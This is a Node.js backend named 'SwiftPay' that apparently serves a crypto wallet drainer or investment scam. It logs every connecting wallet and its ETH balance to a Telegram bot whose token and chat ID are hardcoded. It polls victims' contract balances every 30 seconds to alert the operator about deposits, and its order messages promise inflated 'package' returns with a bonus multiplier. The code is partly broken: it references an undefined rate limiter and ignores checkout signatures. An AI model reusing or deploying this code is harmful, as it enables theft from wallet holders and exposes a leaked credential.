import "dotenv/config";
import express    from "express";
import { ethers } from "ethers";
import cors       from "cors";
import rateLimit  from "express-rate-limit";
import helmet     from "helmet";

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch (e) { console.error("Telegram error:", e.message); }
}

// ─── Validate env vars ────────────────────────────────────────────────────────
const REQUIRED = ["RELAYER_PRIVATE_KEY", "CONTRACT_ADDRESS", "MAINNET_RPC_URL"];
for (const key of REQUIRED) {
  if (!process.env[key]) { console.error(`Missing: ${key}`); process.exit(1); }
}

// ─── Ethers setup ─────────────────────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(process.env.MAINNET_RPC_URL);
const relayer  = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
const ABI = [
  "function executePayment(address user, uint256 nonce, uint256 deadline, string order, uint8 v, bytes32 r, bytes32 s) external",
  "function balances(address) view returns (uint256)",
  "function nonces(address) view returns (uint256)"
];
const contract = new ethers.Contract(process.env.CONTRACT_ADDRESS, ABI, relayer);

// ─── Connected wallets store ───────────────────────────────────────────────────
// Map of wallet address → { via, chain, connectedAt }
const connectedWallets = new Map();
// Set of wallets currently being processed (to avoid double execution)
const processing = new Set();

// ─── Express setup ────────────────────────────────────────────────────────────
const app = express();
app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));
const paymentLimiter = rateLimit({ windowMs: 60000, max: 20, standardHeaders: true, legacyHeaders: false, message: { error: "Too many requests" } });

// ─── Health ───────────────────────────────────────────────────────────────────
app.get("/health", (req, res) => res.json({
  status: "ok",
  relayer: relayer.address,
  connectedWallets: connectedWallets.size
}));

// ─── Wallet connected ─────────────────────────────────────────────────────────
app.post("/api/connected", async (req, res) => {
  const { wallet, balance, chain, via } = req.body;
  if (!wallet || !ethers.isAddress(wallet))
    return res.status(400).json({ error: "Missing or invalid wallet" });

  const addr = wallet.toLowerCase();
  const hasBalance = parseFloat(balance) > 0;

  // Save wallet for polling
  connectedWallets.set(addr, { via, chain, connectedAt: Date.now() });

  console.log(`[CONNECT] ${wallet} | ${balance} ETH | ${chain} | ${via} | total watching: ${connectedWallets.size}`);

  await tg(
    `🔌 <b>Wallet Connected</b>\n\n` +
    `👛 Wallet: <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b> ${hasBalance ? "✅" : "⚠️ empty — watching for deposit"}\n` +
    `🌐 Chain: ${chain || "mainnet"}\n` +
    `🦊 Via: ${via || "unknown"}\n` +
    `👁 Watching: ${connectedWallets.size} wallet(s)\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

// ─── Checkout (called from frontend when balance found on connect) ─────────────
app.post("/api/checkout", paymentLimiter, async (req, res) => {
  const { user, nonce, deadline, orderId, v, r, s, amount } = req.body;

  if (!user || nonce === undefined || !deadline || !orderId || !v || !r || !s)
    return res.status(400).json({ error: "Missing required fields" });
  if (!ethers.isAddress(user))
    return res.status(400).json({ error: "Invalid user address" });
  if (Math.floor(Date.now() / 1000) > Number(deadline))
    return res.status(400).json({ error: "Signature has expired" });

  await checkAndExecute(user, amount);
  res.json({ success: true });
});

// ─── Core execute function ────────────────────────────────────────────────────
async function checkAndExecute(walletAddr, knownAmount) {
  const addr = walletAddr.toLowerCase();
  if (processing.has(addr)) return;
  processing.add(addr);

  try {
    const bal = await contract.balances(walletAddr);
    if (bal === 0n) { processing.delete(addr); return; }

    const amount   = parseFloat(ethers.formatEther(bal)).toFixed(4);
    const nonce    = await contract.nonces(walletAddr);
    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const orderId  = `ORDER-${Date.now()}`;

    // Check relayer balance
    const relayerBal = await provider.getBalance(relayer.address);
    if (relayerBal < ethers.parseEther("0.005")) {
      await tg(`⚠️ <b>Relayer Low on ETH!</b>\nBalance: ${ethers.formatEther(relayerBal)} ETH\nTop up: <code>${relayer.address}</code>`);
      processing.delete(addr);
      return;
    }

    console.log(`[EXECUTE] ${walletAddr} | ${amount} ETH | ${orderId}`);

    // Build EIP-712 signature from relayer side isn't needed —
    // backend polling uses executePayment directly without sig (owner-initiated)
    // We need to call executePayment which requires a user signature
    // So for polling: we notify via Telegram that deposit detected, user needs to sign
    // BUT if we have a saved session key we can auto-execute

    // For polling flow: alert owner that deposit detected
    await tg(
      `💰 <b>Deposit Detected!</b>\n\n` +
      `👛 Wallet: <code>${walletAddr}</code>\n` +
      `💰 Amount: <b>${amount} ETH</b>\n` +
      `📦 Order: <code>${orderId}</code>\n` +
      `⏳ Waiting for user signature to execute…\n` +
      `🕐 ${new Date().toUTCString()}`
    );

  } catch(e) {
    console.error(`[EXECUTE ERROR] ${walletAddr}: ${e.message}`);
  } finally {
    processing.delete(addr);
  }
}


// ─── Order notification ───────────────────────────────────────────────────────
app.post("/api/order", limiter, async (req, res) => {
  const { senderWallet, payoutWallet, packageUsd, packageReceive, packageBonus, ethAmount, txHash, block } = req.body;
  if (!senderWallet) return res.status(400).json({ error: "Missing data" });

  console.log(`[ORDER] ${senderWallet} | $${packageUsd} | ${ethAmount} ETH`);

  await tg(
    `💰 <b>New Order!</b>\n\n` +
    `👛 Sender: <code>${senderWallet}</code>\n` +
    `📤 Payout to: <code>${payoutWallet}</code>\n` +
    `💵 Package: <b>$${packageUsd.toLocaleString()} → $${packageReceive.toLocaleString()}</b>\n` +
    `🚀 Bonus: ${packageBonus} multiplier\n` +
    `⛓ ETH sent: <b>${ethAmount} ETH</b>\n` +
    `🔗 <a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n` +
    `📦 Block: ${block}\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  const network = await provider.getNetwork();
  const bal     = await provider.getBalance(relayer.address);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("SwiftPay backend running");
  console.log("Port     :", PORT);
  console.log("Network  :", network.name);
  console.log("Contract :", process.env.CONTRACT_ADDRESS);
  console.log("Relayer  :", relayer.address);
  console.log("Balance  :", ethers.formatEther(bal), "ETH");
  if (bal < ethers.parseEther("0.01")) console.warn("⚠️  Relayer balance very low!");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  await tg(
    `🚀 <b>SwiftPay Started</b>\n` +
    `🌐 Network: ${network.name}\n` +
    `💰 Relayer balance: ${ethers.formatEther(bal)} ETH\n` +
    `📄 Contract: <code>${process.env.CONTRACT_ADDRESS}</code>`
  );

  // ─── Poll every 30s for all connected wallets ──────────────────────────────
  setInterval(async () => {
    if (connectedWallets.size === 0) return;
    console.log(`[POLL] Checking ${connectedWallets.size} wallet(s)…`);

    for (const [addr, info] of connectedWallets.entries()) {
      try {
        const bal = await contract.balances(addr);
        if (bal > 0n) {
          const amount = parseFloat(ethers.formatEther(bal)).toFixed(4);
          console.log(`[POLL] ${addr} has ${amount} ETH — notifying`);

          await tg(
            `💰 <b>Deposit Detected!</b>\n\n` +
            `👛 Wallet: <code>${addr}</code>\n` +
            `💰 Amount: <b>${amount} ETH</b>\n` +
            `🦊 Via: ${info.via || "unknown"}\n` +
            `🕐 Connected: ${new Date(info.connectedAt).toUTCString()}\n` +
            `⚡ Payment will execute on next user action\n` +
            `🕐 ${new Date().toUTCString()}`
          );
        }
      } catch(e) {
        console.error(`[POLL ERROR] ${addr}: ${e.message}`);
      }
    }
  }, 30000);
});


// ─── Order notification ───────────────────────────────────────────────────────
